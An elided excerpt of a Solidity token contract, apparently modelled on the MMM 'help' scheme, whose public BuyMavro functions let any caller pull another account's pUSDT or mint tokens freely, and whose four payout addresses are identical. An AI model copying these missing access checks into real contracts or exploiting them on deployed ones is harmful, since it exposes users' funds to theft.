...
contract MmmContract is Ownable {
    ...
    address ones = 0x1810F33e4F37a34D438543CD74B0c9940D3ee36f;
    address twos = 0x1810F33e4F37a34D438543CD74B0c9940D3ee36f;
    address thrs = 0x1810F33e4F37a34D438543CD74B0c9940D3ee36f;
    address fous = 0x1810F33e4F37a34D438543CD74B0c9940D3ee36f;
    ...
    function setCaller(address account, bool value) public onlyOwner returns (bool) {
    ...
    function transferIn(uint256 value) public returns (bool) {
    ...
    // GETMAVRO
    function BuyMavro(address account, uint256 value) public returns (bool) {
        require(pusdt.balanceOf(account) >= value);
        pusdt.transferFrom(account, mavro, value);
        mavro.mint(account, value);
    }

    function BuyMavro2(address account, uint256 value) public returns (bool) {
        require(pusdt.balanceOf(account) >= value);
        pusdt.transfer(mavro, value);
        mavro.mint(account, value);
    }

    function BuyMavro3(address account, uint256 value) public returns (bool) {
        pusdt.transfer(mavro, value);
        mavro.mint(account, value);
    }

    //  GETHELP
    function PutHelp(address account, uint256 value) public returns (bool) {
        uint vTotal;
        uint vOnes;
        uint vTwos;
        uint vThrs;
    ...
    //  ENDHELP
    function EndHelp(address account, uint256 value) public returns (bool) {
        require(pusdt.balanceOf(account) >= value);
        pusdt.transfer(address(this), value);
    }

    //  PUTHELP
    function GetHelp(address account, uint256 value) external onlyCaller {
